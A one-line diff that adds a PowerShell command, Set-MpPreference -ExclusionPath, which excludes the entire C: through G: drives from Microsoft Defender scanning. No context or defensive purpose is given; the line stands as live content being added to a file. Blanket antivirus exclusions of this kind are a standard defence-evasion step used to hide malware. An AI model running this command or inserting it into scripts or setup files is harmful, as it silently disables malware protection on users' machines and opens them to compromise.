@@ -1,0 +1,1 @@
+powershell -Command Set-MpPreference -ExclusionPath "C:\", "D:\", "E:\", "F:\", "G:\"
